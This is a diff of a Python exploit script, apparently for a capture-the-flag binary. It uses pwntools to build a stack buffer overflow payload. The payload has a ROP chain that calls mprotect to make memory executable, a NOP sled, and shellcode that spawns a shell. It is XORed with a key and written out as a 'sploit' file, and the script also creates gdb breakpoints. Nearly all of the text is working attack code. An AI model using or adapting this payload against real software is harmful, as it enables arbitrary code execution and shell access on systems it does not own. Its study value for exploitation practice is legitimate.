@@ -8,9 +8,11 @@ context(arch = 'amd64')
 
 tar = sys.argv[1]
 
+
 # Find dynamic elements in file
 loc = find.get_addresses(tar)
 
+"""
 # Create symbolic buffer
 p = angr.Project(tar)
 buf = angr.claripy.BVS("buf",48*8)
@@ -33,69 +35,91 @@ pg.step(step_func = step_func, until = lambda pg: len(pg.found) > 0)
 print pg.errored
 f = pg.found[0]
 print f.state
-print f.state.se.any_str(buf).encode('hex')
-
+cert = f.state.se.any_str(buf)
+"""
 
 # FIXED
 
 # Create killstring
-cert = f.state.se.any_str(buf)
 # cert = '45a64da71bf41084a13d7c2812be721eafc52945ce14815f239b42139e4ff78561cdec4936174ddc288ae81dab39f636'.decode('hex')
+cert = '29084d21ca1323f49d00eca94a53af21d7b21f268506c902191f91e253e4f3a07acf448dc2dcde02e481de40ce0df409'.decode('hex')
 print cert.encode('hex')
-
-mprotect = 0x400790
-overflow = 0x77242B0
-gadget = 0x75229ef
-
-print '%x %x %x' % (mprotect, overflow, gadget)
 
 mprotect = loc['plt_mprotect']
 overflow = loc['buf_loc']
 gadget = loc['load_gadget']
 
-print '%x %x %x' % (mprotect, overflow, gadget)
-
 # kill = '29084d21ca1323f49d00eca94a53af21d7b21f268506c902191f91e253e4f3a07acf448dc2dcde02e481de40ce0df409'.decode('hex')
 
-# Padding up to overflow
-pad2 = 0x200
-shellcode_addr = overflow + pad2
-kill = cyclic(loc['overflow_size'], alphabet = 'ABCD')
+pad0 = loc['overflow_size']
+pad1 = 0x200
+pad2 = 0x100
 
 # Ret to load gadget with modified RBP
-pad1 = 0x100
-arg_addr = overflow + loc['load_offset'] + pad1
-kill += p64(arg_addr)                            # Set RBP for load gadget
-kill += p64(gadget)                              # Load arguments into registers
-kill += p64(shellcode_addr)
+arg_addr = overflow + pad2
+new_rbp = arg_addr + loc['load_offset']
+print 'Load RBP = 0x%x' % new_rbp
+kill = cyclic(pad0, alphabet = 'ABCD')
+kill += p64(new_rbp)                        # Set RBP for load gadget
+kill += p64(gadget)                         # Load arguments into registers
 
 # Prep mprotect arguments
-kill += cyclic(pad1 - len(kill))
-kill += p64(shellcode_addr & 0xFFFFFFFFFFFFF000)  # RDI
-kill += p64(0x1337)
-kill += p64(0x1337)
-kill += p64(0x1000)                               # RSI
-kill += p64(0x7)                                  # RDX
+shellcode_addr = overflow + pad1 + 25  # Shellcode address
+page = shellcode_addr & 0xFFFFFFFFFFFFF000
+print 'Page = 0x%x' % page
+kill += cyclic(pad2 - len(kill))
+kill += p64(page)                           # RDI
+kill += p64(0x1338)                         # junk (RCX)
+kill += p64(0x1337)                         # junk (R8)
+kill += p64(0x1000)                         # RSI
+kill += p64(0x7)                            # RDX
+kill += p64(page)                           # RAX (sometimes RDI <- RAX)
+
+# Run mprotect followed by shellcode
+new_rbp = overflow
+print 'Mprotect RSP = 0x%x' % new_rbp
+kill += cyclic(loc['load_offset'] - 0x30, n = 8)   # Get to RBP (RBP now points here)
+kill += p64(new_rbp)
+kill += p64(mprotect)
+kill += p64(shellcode_addr - 1) # For some F***ing reason, it writes a 0x00 byte here
+# kill += p64(shellcode_addr) # For some F***ing reason, it writes a 0x00 byte here
+
+# Shellcode region
+print 'Add : %d' % (pad1 - len(kill))
+kill += 'A' * (pad1 - len(kill))
+print '0x%x' % (len(kill) + overflow)
+shell = asm(shellcraft.sh())
+print '0x' + shell[:8][::-1].encode('hex')
+kill += '\x90' * 50
+kill += shell
+print 'Shellcode at 0x%x' % shellcode_addr
 
 # Run mprotect
-kill += p64(shellcode_addr & 0xFFFFFFFFFFFFF000)  # RDI
-kill += p64(shellcode_addr & 0xFFFFFFFFFFFFF000)  # RDI
-kill += p64(overflow + 0x300)
+"""
+new_rsp = overflow - 0x300
+print 'Mprotect RSP = 0x%x' % new_rsp
+kill += p64(overflow - new_rsp)                    # Set RBP (to avoid messing up payload)
 kill += p64(mprotect)
+kill += 'A' * 8
 kill += p64(shellcode_addr)
 kill += '\x90' * (pad2 - len(kill))
 kill += asm(shellcraft.sh())
+"""
 
 kill_str = xor(cert + kill, loc['pad'], cut = 'max')
 
+# Generate gdbinit
 write('gdbinit', '''
-        b *0x56381EA
-        b *0x56381F0
+        b *0x%x
+        b *0x%x
+        b *0x75221BF
         r
-''')
+        c
+''' % (gadget, shellcode_addr))
 write('sploit', kill_str.encode('hex'))
 # p = process([tar, kill_str.encode('hex')])
 
 
 print 'Here is some poison:'
+
 print kill_str.encode('hex')
